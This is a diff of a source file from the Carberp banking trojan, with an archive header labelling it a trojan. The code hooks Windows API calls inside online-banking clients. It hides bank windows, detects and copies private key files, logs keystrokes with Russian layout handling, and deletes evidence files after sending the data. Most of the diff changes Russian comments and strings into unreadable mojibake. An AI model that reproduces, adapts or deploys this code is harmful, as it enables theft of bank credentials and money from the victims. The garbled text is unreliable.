@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "Ibank.h"
 //#ifdef RuBnkH
 #include "Strings.h"
@@ -35,7 +46,7 @@ typedef struct __ibankstruct
 PIBANK pIbank;
 
 
-//ф-ции которые будем хукать
+//пїЅ-пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 typedef BOOL   ( WINAPI *PIbankTranslateMessage )( const MSG *lpMsg );
 typedef int    ( WINAPI *PConnect				)( SOCKET s, const struct sockaddr *name, int namelen );
 typedef HANDLE ( WINAPI *PCreateFileW			)( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
@@ -48,7 +59,7 @@ PConnect				Real_Connect;
 PCreateFileW			Real_CreateFileW;
 PShowWindow				Real_ShowWindow1;
 
-//языки самой программы
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 #define ENTER_SYSTEM_MENU_RUS	      0x144497E5
 #define SYNCHRONIZATION_WITH_BANK_RUS 0x9548BABC
 #define SYNCHRONIZATION_PROCESS_RUS	  0xC8BBFA76
@@ -62,16 +73,16 @@ PShowWindow				Real_ShowWindow1;
 #define SYNCHRONIZATION_PROCESS_ENG   0xB28711CE
 
 
-//меню
-#define ENTER_SYSTEM_MENU		  1 //меню ввода пароля в PC, меню ввода пароля + серта в браузере
-#define SYNCHRONIZATION_WITH_BANK 2 //меню ввода пароля + серта в PC
-#define SYNCHRONIZATION_PROCESS   3 //отправка данных в PC
+//пїЅпїЅпїЅпїЅ
+#define ENTER_SYSTEM_MENU		  1 //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ PC, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ + пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+#define SYNCHRONIZATION_WITH_BANK 2 //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ + пїЅпїЅпїЅпїЅпїЅ пїЅ PC
+#define SYNCHRONIZATION_PROCESS   3 //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ PC
 
-//если вдруг не находится ни одного сервака ява судорожно пытаеться приконнектиться к чемулибо много раз, и 
-//соотвецтвенно бот хочет отправить данные много раз, что приводит к переполнению стека, и окончанию выделяемой памяти, и все падает
-// для избежания этого вводим флаг 
+//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅ 
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ 
 bool OnceSend = true;
-//всякая хуйня
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 bool SHIFT_FLAG = false;
 bool CAPSL_FLAG = false;
 
@@ -118,7 +129,7 @@ int m_tolower_rus( int c )
 }
 
 
-// Проверяет существование flag.dat файла
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ flag.dat пїЅпїЅпїЅпїЅпїЅ
 bool checkFileFlag()
 {
 	CHAR* sAppData = (CHAR*)MemAlloc(MAX_PATH * sizeof(CHAR));
@@ -154,7 +165,7 @@ void Hide(HWND hWnd, BOOL makeToolWindow)
 	}
 }
 
-BOOL WINAPI Hook_ShowWindow1(HWND hWnd, int Cmd)//отлавливаем окна которые показывает
+BOOL WINAPI Hook_ShowWindow1(HWND hWnd, int Cmd)//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 {
 
 
@@ -162,7 +173,7 @@ BOOL WINAPI Hook_ShowWindow1(HWND hWnd, int Cmd)//отлавливаем окна которые показ
 	WCHAR cText[MAX_PATH];
 	pGetWindowTextW(hWnd,cText,MAX_PATH);
 	
-	if((plstrcmpW(cText, L"Вход в систему") == 0))
+	if((plstrcmpW(cText, L"пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ") == 0))
 	{
 		
 		
@@ -178,15 +189,15 @@ BOOL WINAPI Hook_ShowWindow1(HWND hWnd, int Cmd)//отлавливаем окна которые показ
 
 	if(checkFileFlag())
 	{
-		IBANK_DBG("IBANK","файл не создан поэтому ловим окна");
-		if((plstrcmpW(cText, L"Выбор счета") == 0)||(plstrcmpW(cText, L"Вибір рахунка") == 0)||(plstrcmpW(cText, L"Предупреждение") == 0)) 
+		IBANK_DBG("IBANK","пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ");
+		if((plstrcmpW(cText, L"пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ") == 0)||(plstrcmpW(cText, L"пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ") == 0)||(plstrcmpW(cText, L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ") == 0)) 
 		{
 			Hide(hWnd);
 			//Cmd = SW_HIDE;
 
-			IBANK_DBG("IBANK поймали окошко с титлом","Выбор счета HIDE, Предупреждение HIDE"); 
+			IBANK_DBG("IBANK пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ","пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ HIDE, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HIDE"); 
 		}
-		else if(plstrcmpW(cText, L"Редактор документов") == 0)
+		else if(plstrcmpW(cText, L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ") == 0)
 		{
 			Hide(hWnd, TRUE);
 			if(hWnd_Editor != NULL)
@@ -195,15 +206,15 @@ BOOL WINAPI Hook_ShowWindow1(HWND hWnd, int Cmd)//отлавливаем окна которые показ
 				pDestroyWindow(hWnd);
 			}
 			hWnd_Editor = hWnd;
-			IBANK_DBG("IBANK поймали окошко с титлом","Редактор документов HIDE"); 
+			IBANK_DBG("IBANK пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HIDE"); 
 		}
 		/*else 
-		if(plstrcmpW(cText, L"Редактор документов") == 0) { Cmd = SW_HIDE; pOutputDebugStringW(L"Редактор документов HIDE"); }
+		if(plstrcmpW(cText, L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ") == 0) { Cmd = SW_HIDE; pOutputDebugStringW(L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HIDE"); }
 		else 
-		if(plstrcmpW(cText, L"Предупреждение") == 0) { Cmd = SW_HIDE; pOutputDebugStringW(L"Предупреждение HIDE"); }*/
-		if (NULL!=(PTSTR)pStrStrIW(cText,L"Ошибка"))
+		if(plstrcmpW(cText, L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ") == 0) { Cmd = SW_HIDE; pOutputDebugStringW(L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ HIDE"); }*/
+		if (NULL!=(PTSTR)pStrStrIW(cText,L"пїЅпїЅпїЅпїЅпїЅпїЅ"))
 		{
-			IBANK_DBG("Ibank","поймалось окно Ошибка");
+			IBANK_DBG("Ibank","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 			
 			//Cmd=SW_HIDE;
 			pSetWindowLongW(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongW(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
@@ -268,19 +279,19 @@ void DbgMsg(const char *format, ...)
 HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile )
 {
 	HANDLE hRet = Real_CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
-	//если открывается для чтения
+	//пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if( (dwDesiredAccess & GENERIC_READ) &&  dwCreationDisposition == OPEN_EXISTING )
 	{
-		//открываем отдельно для анализа
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		HANDLE hFile = Real_CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
 		if ( hFile != INVALID_HANDLE_VALUE )
 		{		
 			DWORD h;
 			DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );
-			//нужных размеров
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if( dwFileSize > 500 && dwFileSize < 3000 )
 			{
-				//читаем полносью в память
+				//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 				HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );
 				LPBYTE pbyFile  = NULL;
 				if ( hMapFile != INVALID_HANDLE_VALUE )
@@ -288,27 +299,27 @@ HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD
 					LPBYTE pbyFile = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );
 					if ( pbyFile != NULL )
 					{
-						//не zip (jar) архив
+						//пїЅпїЅ zip (jar) пїЅпїЅпїЅпїЅпїЅ
 						if( pbyFile[0] != 'P' || pbyFile[1] != 'K' )
 						{
-							//считаем частоту символов
+							//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							int s[256];
 							m_memset( s, 0, sizeof(s) );
 							for( int i = 0; i < dwFileSize; i++ ) s[pbyFile[i]]++;
-							//средняя частота символа
+							//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 							int avg = dwFileSize / 256;
-							//начало и конец диапазона равномерно распределенных частот
+							//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 							int min = avg - avg / 2 - 1; if( min <= 0 ) min = 1;
 							int max = avg + avg / 2 + 1;
-							//подсчитываем количество попаданий частот в диапазоне [m1;m2]
+							//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ [m1;m2]
 							int m1 = 0, m2 = 0;
 							for( int i = 0; i < 256; i++ )
 								if( min <= s[i] && s[i] <= max ) 
 									m1++;
 								else
 									m2++;
-						        //если частоты равномерно распределены, то количество попаданий 
-						        //должно быть примерно в два раза больше
+						        //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ 
+						        //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 							if( m1 / 2 > m2 )
 							{
 								OutputDebugString("key file");
@@ -334,7 +345,7 @@ HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD
 	
 	DWORD dwCurrentMenu = GetCurrentMenuType();
 
-	if ( dwCurrentMenu == ENTER_SYSTEM_MENU || dwCurrentMenu == SYNCHRONIZATION_WITH_BANK ) // Вход в систему или Синхронизация с банком
+	if ( dwCurrentMenu == ENTER_SYSTEM_MENU || dwCurrentMenu == SYNCHRONIZATION_WITH_BANK ) // пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		
 		
@@ -343,11 +354,11 @@ HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD
 		{			
 			WCHAR FileName[ MAX_PATH ];
 			plstrcpyW( FileName, lpFileName );
-			IBANK_DBG("Ibank","Разберемся каково разширение файла ключа Hook_CreateFileW");
+			IBANK_DBG("Ibank","пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ Hook_CreateFileW");
 			OutputDebugStringW(lpFileName);
 			DbgMsg( "%08x %08x", dwDesiredAccess, dwCreationDisposition );
-            // IBank по расширению dat определяем
-			if ( GetFileFormat( FileName ) == 0x1930F4 || GetFileFormat( FileName ) ==0x1AB5F3)	//  раcширение dat или jks                                                                
+            // IBank пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dat пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+			if ( GetFileFormat( FileName ) == 0x1930F4 || GetFileFormat( FileName ) ==0x1AB5F3)	//  пїЅпїЅcпїЅпїЅпїЅпїЅпїЅпїЅпїЅ dat пїЅпїЅпїЅ jks                                                                
 			{
 				if ( ( pIbank->CertTempPath = (WCHAR*)MemAlloc( 1024 ) ) != NULL )
 				{
@@ -356,7 +367,7 @@ HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD
 				}
 			}
 
-            // IBank по сигнатуре файла определяем
+            // IBank пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			else 
 			{
 				HANDLE hFile = Real_CreateFileW( lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile );
@@ -418,10 +429,10 @@ HANDLE WINAPI Hook_CreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD
 #define MAX_SISE_OF_FOUND 1024*1000
 LONGLONG SizeOfFiles(WCHAR* Path)
 {
-	// Возвращает общий размер файлов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	LONGLONG nFileLen = 0;
 	
-	//создаем маску
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	WCHAR cPath[MAX_PATH];
 	m_memset(cPath,0,MAX_PATH*2);
 	plstrcpyW(&cPath[0],Path);
@@ -433,16 +444,16 @@ LONGLONG SizeOfFiles(WCHAR* Path)
 	{
 		return -1;
 	}
-	// Перебираем найденные файлы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	while (File != NULL)
 	{
         if ((Search.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
 		{	
-			nFileLen = nFileLen+(Search.nFileSizeHigh * (4294967295+1)) + Search.nFileSizeLow;// на случай очень большого файла			
+			nFileLen = nFileLen+(Search.nFileSizeHigh * (4294967295+1)) + Search.nFileSizeLow;// пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ			
         }
 		else
 		{
-			//выкидываем лишние 
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ 
 			if( plstrcmpW( Search.cFileName,L".") != 0 &&
 				plstrcmpW( Search.cFileName,L"..") != 0 )
 			{
@@ -457,10 +468,10 @@ LONGLONG SizeOfFiles(WCHAR* Path)
 					break;
 			}
 		}
-		// Получаем следцющий файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		if (!pFindNextFileW(File, &Search)) break;;
 	}
-	// Освобождаем данные	
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ	
 	pFindClose(File);
 	return nFileLen;
 }
@@ -474,7 +485,7 @@ bool DirMorEmb(WCHAR*FilderName)
 }
 
 
-///необходимые флаги
+///пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 typedef enum {
     SHGFP_TYPE_CURRENT  = 0,   // current value for user, verify it exists
     SHGFP_TYPE_DEFAULT  = 1,   // default value, may not exist
@@ -509,7 +520,7 @@ bool OpenFileAndMessage()
 		hHandle	=	pCreateFileW(SysPathRu, GENERIC_READ, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
 		pReadFile(hHandle,ReadData,1024,&dwReadDD,NULL);
 		pCloseHandle(hHandle);
-		pMessageBoxA(0,ReadData,"Информация",MB_ICONINFORMATION);
+		pMessageBoxA(0,ReadData,"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ",MB_ICONINFORMATION);
 		return true;
 	}
 	else
@@ -521,7 +532,7 @@ bool OpenFileAndMessage()
 		hHandle	=	pCreateFileW(SysPathUa, GENERIC_READ, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );
 		pReadFile(hHandle,ReadData,1024,&dwReadDD,NULL);
 		pCloseHandle(hHandle);
-		pMessageBoxA(0,ReadData,"Информация",MB_ICONINFORMATION);
+		pMessageBoxA(0,ReadData,"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ",MB_ICONINFORMATION);
 		return true;
 	}
 	return false;
@@ -559,7 +570,7 @@ BOOL IsPatchCompete()
 	plstrcpyA(RtJarFileNameBefore, JREPath);
 	plstrcatA(RtJarFileNameBefore,  "\\lib\\rtB.jar");
 
-	// файл rt.jar до патча(не обязательно оригинальный)
+	// пїЅпїЅпїЅпїЅ rt.jar пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ(пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 	HANDLE hRtBefore = (HANDLE)pCreateFileA( RtJarFileNameBefore, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
 	MemFree(RtJarFileNameBefore);
 	if(hRtBefore != INVALID_HANDLE_VALUE)
@@ -591,7 +602,7 @@ BOOL IsPatchCompete()
 		return false;
 	}
 
-	// файл rt.jar после патча
+	// пїЅпїЅпїЅпїЅ rt.jar пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	CHAR* RtJarFileNameAfter = (CHAR*)MemAlloc(MAX_PATH);
 	plstrcpyA(RtJarFileNameAfter, JREPath);
 	plstrcatA(RtJarFileNameAfter,  "\\lib\\rt.jar");
@@ -735,7 +746,7 @@ int WINAPI Hook_Connect( SOCKET s, const struct sockaddr *name, int namelen )
 
 					#ifdef		JAVS_PATCHERH		
 					if(	ClearAndDel(NULL)) {
-						IBANK_DBG("IBank.cpp", "У вас старая версия явы,работа на ней не поддерживается,\nскачайте новую версию на сайте http://www.java.com");
+						IBANK_DBG("IBank.cpp", "пїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ,пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,\nпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ http://www.java.com");
 						return -1;
 					}
 					else
@@ -773,7 +784,7 @@ int WINAPI Hook_Connect( SOCKET s, const struct sockaddr *name, int namelen )
 
 						if ( pIbank->CertTempPath )
 						{	
-							//если jks
+							//пїЅпїЅпїЅпїЅ jks
 							if (GetFileFormat( pIbank->CertTempPath ) ==0x1AB5F3)
 							{
 								Data->FileType	= 6;
@@ -855,7 +866,7 @@ int WINAPI Hook_Connect( SOCKET s, const struct sockaddr *name, int namelen )
 
 			pDeleteFileA( InfoFile );
 			pDeleteFileA( ScreenFile );
-			IBANK_DBG("Ibank","Мочим файлы");
+			IBANK_DBG("Ibank","пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ");
 
 			STR::Free(InfoFile);
 			STR::Free(ScreenFile);
@@ -1009,7 +1020,7 @@ void TranslateSymbol( DWORD dwKeyLayout, char Symbol, PBYTE OutSymbol )
 		}
 		else if ( (int)Symbol == 51 )
 		{
-			Symb = '№';
+			Symb = 'пїЅ';
 		}
 		else if ( (int)Symbol == 52 )
 		{
@@ -1041,7 +1052,7 @@ void TranslateSymbol( DWORD dwKeyLayout, char Symbol, PBYTE OutSymbol )
 		}
 		else if ( (int)Symbol == 96 )
 		{
-			Symb = 'Ё';
+			Symb = 'пїЅ';
 		}
 		else if ( (int)Symbol == 45 )
 		{
@@ -1282,32 +1293,32 @@ void ParseKeys( const MSG *lpMsg, DWORD dwCurrentMenu )
 			{
 				if ( lpMsg->wParam == 219 )
 				{
-					Symbol[0] = 'х';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 221 )
 				{
-					Symbol[0] = 'ъ';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 186 )
 				{
-					Symbol[0] = 'ж';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 222 )
 				{
-					Symbol[0] = 'э';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 188 )
 				{
-					Symbol[0] = 'б';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 190 )
 				{
-					Symbol[0] = 'ю';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 191 )
@@ -1317,132 +1328,132 @@ void ParseKeys( const MSG *lpMsg, DWORD dwCurrentMenu )
 				}
 				else if ( lpMsg->wParam == 65 )
 				{
-					Symbol[0] = 'ф';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 66 )
 				{
-					Symbol[0] = 'и';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 67 )
 				{
-					Symbol[0] = 'с';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 68 )
 				{
-					Symbol[0] = 'в';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 69 )
 				{
-					Symbol[0] = 'у';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 70 )
 				{
-					Symbol[0] = 'а';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 71 )
 				{
-					Symbol[0] = 'п';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 72 )
 				{
-					Symbol[0] = 'р';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 73 )
 				{
-					Symbol[0] = 'ш';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
 				else if ( lpMsg->wParam == 74 )
 				{
-					Symbol[0] = 'о';
+					Symbol[0] = 'пїЅ';
 					Symbol[1] = '\0';
 				}
